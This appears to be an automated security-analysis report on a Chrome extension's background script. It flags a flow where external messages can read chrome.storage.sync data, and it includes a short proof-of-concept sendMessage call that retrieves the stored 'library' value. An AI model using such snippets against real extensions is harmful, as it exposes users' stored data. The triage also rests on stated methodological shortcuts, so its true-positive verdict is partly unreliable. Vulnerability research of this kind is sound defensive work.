# CoCo Analysis: bidnnalgdambofjfpcdncpjfmamhelmi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bidnnalgdambofjfpcdncpjfmamhelmi/opgen_generated_files/bg.js
Line 965 (minified code in background.js)

**Code:**

```javascript
// Background script (bg.js) - Line 965 (formatted for readability)
(() => {
  "use strict";
  const e = ["library.theflows.app"];  // Whitelist of allowed origins
  let t = "";

  chrome.runtime.onMessageExternal.addListener(((n, r, s) => {
    // Check if sender origin is in whitelist
    var o = String(r.origin);

    if (e.includes(o)) {  // If origin is library.theflows.app
      if (n.component) {
        t = n.component.toString();
        s({success: true});
      } else if (n.getComponent) {  // ← External attacker triggers this
        chrome.storage.sync.get(["library"], (function(e) {
          return s({component: e.library});  // ← Sends stored data back to external caller
        }));
      }
    } else {
      s({success: false});
    }
  }));

  chrome.runtime.setUninstallURL("https://lib.certifiedcode.us/uninstall");

  chrome.tabs.onActivated.addListener((e => {
    e.tabId && t && chrome.tabs.sendMessage(e.tabId, {component: t});
  }));
})();
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (library.theflows.app)

**Attack:**

```javascript
// From https://library.theflows.app/* or any extension/page that can send external messages
// Send external message to extension
chrome.runtime.sendMessage(
  "bidnnalgdambofjfpcdncpjfmamhelmi",  // Extension ID
  { getComponent: true },
  function(response) {
    console.log("Retrieved library data:", response.component);
    // Attacker receives stored library component data
  }
);
```

**Impact:** Information disclosure. An external caller from the whitelisted domain `library.theflows.app` (or potentially other extensions/pages if manifest externally_connectable is not properly configured) can trigger the extension to read data from chrome.storage.sync (specifically the "library" key) and receive it back via sendResponse. This allows unauthorized access to stored extension data. According to the methodology, even if only ONE specific domain can exploit it, this is classified as TRUE POSITIVE, and we ignore manifest.json restrictions on message passing.
